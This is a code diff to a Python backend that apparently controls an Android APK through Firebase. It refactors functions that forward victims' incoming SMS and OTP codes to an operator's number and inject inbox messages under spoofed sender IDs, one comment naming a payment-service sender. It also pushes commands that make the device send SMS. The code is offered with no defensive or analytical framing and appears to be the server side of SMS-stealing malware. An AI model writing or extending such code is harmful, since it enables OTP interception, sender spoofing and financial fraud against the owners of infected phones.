@@ -2,8 +2,6 @@ import json
 import logging
 import time
 from datetime import datetime, timezone
-from urllib.parse import quote
-
 import httpx
 
 from app.config import get_settings
@@ -12,9 +10,6 @@ from app.firebase_client import normalize_firebase_url
 
 logger = logging.getLogger(__name__)
 settings = get_settings()
-
-OUTGOING_SENDER = "__OUT__"
-
 
 def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     if profile.firebase_url:
@@ -57,13 +52,6 @@ def get_license_key(profile: MonitorProfile) -> str | None:
     return None
 
 
-def _config_path_key(license_key: str) -> str:
-    key = license_key.strip()
-    if key.lower().startswith("http"):
-        return quote(key, safe="")
-    return key.upper()
-
-
 _http_client: httpx.AsyncClient | None = None
 
 
@@ -81,64 +69,27 @@ async def _firebase_put(url: str, data: dict) -> None:
 
 
 async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
-    """Push config for Virtus APK (virtus_config + module DB config/{KEY})."""
-    module_db = settings.virtus_module_db.rstrip("/")
+    """Push Astik-style APK config to module DB: config/{KEY}."""
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return
 
     license_key = get_license_key(profile)
-    device_id = resolve_apk_poll_id(profile, device)
-    monitoring = profile.is_monitoring
-    key_valid = False
+    if not license_key or not license_key.upper().startswith("KEY-"):
+        return
 
-    if license_key and license_key.upper().startswith("KEY-"):
-        from app.license_keys import license_key_exists, push_key_config
+    from app.license_keys import license_key_exists, push_key_config
 
-        key_valid = license_key_exists(license_key)
-        if key_valid:
-            firebase_bases = [profile.firebase_url] if profile.firebase_url else None
-            await push_key_config(
-                license_key,
-                monitoring=monitoring,
-                device_id=device_id,
-                channel_id=profile.channel_id,
-                target_number=profile.phone_number,
-                sim_index=profile.selected_sim_index or 0,
-                firebase_bases=firebase_bases or [firebase_url],
-                firebase_url=firebase_url,
-            )
+    if not license_key_exists(license_key):
+        return
 
-    sim_index = profile.selected_sim_index or 0
-    sim_slot = sim_index + 1
-    if device and device.device_meta:
-        try:
-            meta = json.loads(device.device_meta)
-            sims = meta.get("sims") or []
-            if sims and 0 <= sim_index < len(sims):
-                sim_slot = int(sims[sim_index].get("slot") or sim_slot)
-        except (json.JSONDecodeError, TypeError, ValueError):
-            pass
-
-    payload = {
-        "monitoring": monitoring,
-        "key_valid": key_valid,
-        "license_key": license_key if key_valid else "",
-        "ts": int(time.time() * 1000),
-        "firebase_url": firebase_url,
-        "device_id": device_id,
-        "firebase_key": license_key if key_valid else "",
-        "channel_id": profile.channel_id,
-        "target_number": profile.phone_number,
-        "sim_index": sim_index,
-        "sim_slot": sim_slot,
-    }
-
-    user_fb = get_profile_firebase_url(profile)
-    if user_fb:
-        await _firebase_put(f"{user_fb}/virtus_config", payload)
-        if key_valid and license_key:
-            await _firebase_put(f"{user_fb}/config/{_config_path_key(license_key)}", payload)
+    await push_key_config(
+        license_key,
+        monitoring=profile.is_monitoring,
+        device_id=resolve_apk_poll_id(profile, device),
+        target_number=profile.phone_number,
+        firebase_url=firebase_url,
+    )
 
 
 async def push_outgoing_sms_command(
@@ -241,51 +192,50 @@ def mynum_device_id(phone_number: str) -> str:
     return f"num-{normalize_phone(phone_number)}"
 
 
+async def push_mynum_inject(
+    profile: MonitorProfile,
+    device: Device,
+    sender: str,
+    body: str,
+) -> str | None:
+    """Astik-style inject: {firebase_url}/messages/num-{mynum}/{id}."""
+    firebase_url = resolve_firebase_url(profile, device)
+    if not firebase_url or not profile.phone_number:
+        return None
+    return await push_inject_message(
+        firebase_url,
+        mynum_device_id(profile.phone_number),
+        sender,
+        body,
+    )
+
+
 async def push_outbound_to_firebase(
     profile: MonitorProfile,
     device: Device,
     outbound: OutboundSMS,
 ) -> str | None:
-    """Push outgoing send or inject command to Firebase for Virtus APK."""
+    """Forward incoming OTP to /mynum inject path; real SMS via commands/ on device."""
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return None
 
     try:
-        if outbound.spoof_sender and outbound.to_number:
-            # Inject on /mynum phone so inbox shows original sender (AX-PHONPE-S, etc.)
-            return await push_inject_message(
-                firebase_url,
-                mynum_device_id(outbound.to_number),
+        if outbound.spoof_sender and profile.phone_number:
+            return await push_mynum_inject(
+                profile,
+                device,
                 outbound.spoof_sender,
                 outbound.message,
             )
-        if outbound.spoof_sender:
-            return await push_inject_message(
-                firebase_url,
-                device.name,
-                outbound.spoof_sender,
-                outbound.message,
-            )
-        body = f"{outbound.to_number}\n{outbound.message}\n{outbound.sim_index}"
-        command_id = await push_inject_message(
+        return await push_outgoing_sms_command(
             firebase_url,
             device.name,
-            OUTGOING_SENDER,
-            body,
+            outbound.to_number,
+            outbound.message,
+            sim_index=outbound.sim_index,
+            sim_slot=outbound.sim_slot,
         )
-        try:
-            await push_outgoing_sms_command(
-                firebase_url,
-                device.name,
-                outbound.to_number,
-                outbound.message,
-                sim_index=outbound.sim_index,
-                sim_slot=outbound.sim_slot,
-            )
-        except Exception:
-            pass
-        return command_id
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
         return None
@@ -333,13 +283,14 @@ async def forward_incoming_to_mynum(
     message: str,
 ) -> None:
     """Forward incoming SMS/OTP to /mynum via inject — same sender ID (Astik-style)."""
-    from app.channel_relay import queue_forward_to_mynum
+    from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum
 
     if not profile.phone_number or not profile.is_monitoring:
         return
 
     try:
-        outbound = queue_forward_to_mynum(db, profile, device, sender, message)
-        await push_outbound_to_firebase(profile, device, outbound)
+        sender, message = prepare_sms_forward(sender, message)
+        await push_mynum_inject(profile, device, sender, message)
+        queue_forward_to_mynum(db, profile, device, sender, message)
     except Exception as exc:
         logger.warning("Forward to mynum failed for device %s: %s", device.id, exc)
